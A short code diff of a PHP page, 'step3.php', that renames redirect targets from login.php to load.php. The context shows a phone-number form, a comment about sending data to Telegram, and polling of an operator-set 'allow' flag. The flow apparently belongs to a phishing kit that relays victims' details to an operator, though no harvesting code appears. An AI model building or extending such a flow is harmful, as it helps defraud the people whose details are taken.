@@ -206,11 +206,11 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['submit_application'])
                 if ($allowValue == 0) {
                     // Send to Telegram and stay at step3.php
                     $telegram_success = true;
-                    // Don't redirect to login.php, stay on this page
+                    // Don't redirect to load.php, stay on this page
                     error_log("Allow value is 0 for user $phone - staying on step3.php");
                 } elseif ($allowValue == 1) {
-                    // Proceed to login.php
-                    header("Location: login.php");
+                    // Proceed to load.php
+                    header("Location: load.php");
                     exit;
                 } else {
                     // Default case - treat as 0
@@ -367,7 +367,7 @@ function checkAllowStatus() {
             console.log('Allow status:', data.allow);
             
             if (data.allow === 1) {
-                // Status is 1, redirect to login.php
+                // Status is 1, redirect to load.php
                 if (!redirectAttempted) {
                     redirectAttempted = true;
                     
@@ -390,7 +390,7 @@ function checkAllowStatus() {
                     
                     // Redirect after 2 seconds
                     setTimeout(() => {
-                        window.location.href = 'login.php';
+                        window.location.href = 'load.php';
                     }, 2000);
                 }
             }
